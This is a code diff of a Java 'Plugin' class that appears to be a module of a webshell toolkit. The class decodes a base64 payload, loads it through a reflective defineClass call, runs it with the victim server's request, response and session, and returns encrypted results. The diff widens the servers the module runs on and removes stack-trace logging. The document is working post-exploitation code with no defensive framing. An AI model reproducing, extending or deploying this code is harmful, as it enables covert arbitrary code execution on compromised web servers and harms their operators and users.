@@ -10,7 +10,6 @@ import javax.servlet.ServletOutputStream;
 import javax.servlet.ServletRequest;
 import javax.servlet.ServletResponse;
 import javax.servlet.http.HttpSession;
-import javax.servlet.jsp.PageContext;
 
 public class Plugin {
    public static String taskID;
@@ -21,21 +20,25 @@ public class Plugin {
    private HttpSession Session;
 
    public boolean equals(Object obj) {
-      PageContext page = (PageContext)obj;
-      this.Session = page.getSession();
-      this.Response = page.getResponse();
-      this.Request = page.getRequest();
-      page.getResponse().setCharacterEncoding("UTF-8");
-      Map result = new HashMap();
+      HashMap result = new HashMap();
+
+      try {
+         this.fillContext(obj);
+      } catch (Exception var44) {
+         result.put("msg", var44.getMessage());
+         result.put("status", "fail");
+         return true;
+      }
+
       if (action.equals("submit")) {
          ClassLoader classLoader = this.getClass().getClassLoader();
          Class urlClass = ClassLoader.class;
-         boolean var36 = false;
+         boolean var37 = false;
 
          ServletOutputStream so = null;
-         label207: {
+         label230: {
             try {
-               var36 = true;
+               var37 = true;
                Method method = urlClass.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                method.setAccessible(true);
                byte[] payloadData = this.base64decode(payload);
@@ -45,23 +48,20 @@ public class Plugin {
                payloadMethod.invoke(payloadObj, this.Request, this.Response, this.Session);
                result.put("msg", "任务提交成功");
                result.put("status", "success");
-               var36 = false;
-               break label207;
-            } catch (Exception var43) {
-               var43.printStackTrace();
-               result.put("msg", var43.getMessage());
+               var37 = false;
+               break label230;
+            } catch (Exception var45) {
+               result.put("msg", var45.getMessage());
                result.put("status", "fail");
-               var36 = false;
+               var37 = false;
             } finally {
-               if (var36) {
+               if (var37) {
                   try {
                      so = this.Response.getOutputStream();
                      so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                      so.flush();
                      so.close();
-                     page.getOut().clear();
-                  } catch (Exception var37) {
-                     var37.printStackTrace();
+                  } catch (Exception var39) {
                   }
 
                }
@@ -72,9 +72,7 @@ public class Plugin {
                so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                so.flush();
                so.close();
-               page.getOut().clear();
-            } catch (Exception var41) {
-               var41.printStackTrace();
+            } catch (Exception var42) {
             }
 
             return true;
@@ -85,27 +83,25 @@ public class Plugin {
             so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
             so.flush();
             so.close();
-            page.getOut().clear();
-         } catch (Exception var42) {
-            var42.printStackTrace();
+         } catch (Exception var43) {
          }
       } else if (action.equals("getResult")) {
          boolean var25 = false;
 
-         ServletOutputStream so;
-         label208: {
+         ServletOutputStream so = null;
+         label231: {
             try {
                var25 = true;
                Map taskResult = (Map)this.Session.getAttribute(taskID);
                Map temp = new HashMap();
-               temp.put("running", (String)taskResult.get("running"));
+               temp.put("running", taskResult.get("running"));
                temp.put("result", this.base64encode((String)taskResult.get("result")));
                result.put("msg", this.buildJson(temp, false));
                result.put("status", "success");
                var25 = false;
-               break label208;
-            } catch (Exception var45) {
-               result.put("msg", var45.getMessage());
+               break label231;
+            } catch (Exception var47) {
+               result.put("msg", var47.getMessage());
                result.put("status", "fail");
                var25 = false;
             } finally {
@@ -115,9 +111,7 @@ public class Plugin {
                      so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                      so.flush();
                      so.close();
-                     page.getOut().clear();
                   } catch (Exception var38) {
-                     var38.printStackTrace();
                   }
 
                }
@@ -128,9 +122,7 @@ public class Plugin {
                so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                so.flush();
                so.close();
-               page.getOut().clear();
-            } catch (Exception var39) {
-               var39.printStackTrace();
+            } catch (Exception var40) {
             }
 
             return true;
@@ -141,9 +133,7 @@ public class Plugin {
             so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
             so.flush();
             so.close();
-            page.getOut().clear();
-         } catch (Exception var40) {
-            var40.printStackTrace();
+         } catch (Exception var41) {
          }
       }
 
@@ -229,14 +219,29 @@ public class Plugin {
          this.getClass();
          Base64 = Class.forName("java.util.Base64");
          Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
-         result = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
+         result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text));
       } else {
          this.getClass();
          Base64 = Class.forName("sun.misc.BASE64Decoder");
          Decoder = Base64.newInstance();
-         result = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text);
+         result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text));
       }
 
       return result;
+   }
+
+   private void fillContext(Object obj) throws Exception {
+      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
+         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
+         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
+         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+      } else {
+         Map objMap = (Map)obj;
+         this.Session = (HttpSession)objMap.get("session");
+         this.Response = (ServletResponse)objMap.get("response");
+         this.Request = (ServletRequest)objMap.get("request");
+      }
+
+      this.Response.setCharacterEncoding("UTF-8");
    }
 }
